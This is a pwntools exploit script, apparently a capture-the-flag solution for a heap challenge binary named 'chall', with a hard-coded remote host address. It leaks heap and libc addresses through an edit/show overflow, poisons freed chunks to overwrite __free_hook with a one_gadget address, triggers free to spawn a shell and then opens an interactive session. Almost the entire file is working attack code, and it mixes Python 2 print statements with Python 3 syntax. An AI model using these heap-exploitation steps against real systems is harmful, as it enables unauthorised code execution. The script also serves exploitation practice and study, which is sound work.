from pwn import *
from pwn import p64,u64,p32,u32,p8

context.arch = 'amd64'
context.log_level = 'debug'
#context.terminal = ['tmux','sp','-h']

# elf = ELF('./chall')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# libc = ELF('')

io = process('./chall')
io = remote("8.134.37.86",28542)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,content):
    io.sendlineafter('>>', b'passwd:Cr4at3 \nopcode:1\n')
    io.sendlineafter('>>>',str(size))
    io.sendafter('>>>',content)

def delete(idx):
    io.sendlineafter('>>', b'passwd:D3l4te \nopcode:4\n')
    io.sendlineafter('>>>',str(idx))

def edit(idx,content):
    io.sendlineafter('>>', b'passwd:Ed1t \nopcode:3\n')
    io.sendlineafter('>>>',str(idx))
    io.sendafter('>>>',content)

def show(idx):
    io.sendlineafter('>>', b'passwd:SH0w \nopcode:2\n')
    io.sendlineafter('>>>',str(idx))

def recv(junk):
#	 io.recvuntil(junk)
# 	 leak = u64(io.recv(6).ljust(8,b'00))
     leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
     info('leak:',hex(leak))
     return leak

for i in range(11):
	create(0x208,b'a'*0x8)
edit(0,'b'*0x208)
show(0)
io.recvuntil('b'*0x208)
heap_addr = u64(io.recv(6).ljust(8,'\x00'))
print "heap_addr:",hex(heap_addr)

for i in range(9):
	delete(0)
for i in range(7):
	create(0x208,b'a'*0x8)
for i in range(1):
	create(0x208,b'a'*0x8)
show(0)
io.recvuntil('a'*0x8)
leak_addr = u64(io.recv(6).ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libc_base = leak_addr - (0x7ffff7dcdeb0-0x7ffff79e2000)
print "libc_base:",hex(libc_base)
free_hook = libc_base + libc.sym['__free_hook']
print "free_hook:",hex(free_hook)
onegadget = [0x4f3d5,0x4f432,0x10a41c]

create(0x208,'a'*8)#2
create(0x208,'a'*8)#1->2
create(0x208,'a'*8)#0->1
delete(2)
create(0x208,'a'*8)#2->0
edit(0,'c'*0x208)
delete(2)
edit(0,'c'*0x208+p64(heap_addr-0x9e0)+p64(0x220)+p64(0x221)+p64(free_hook)+p8(0x73))

create(0x208,b'\x00')
create(0x208,b'\x00')
edit(0,p64(libc_base+onegadget[1]))
#delete(5)

#gdb.attach(io, 'b *$rebase(0x0Cc1)')
delete(0)

io.interactive()
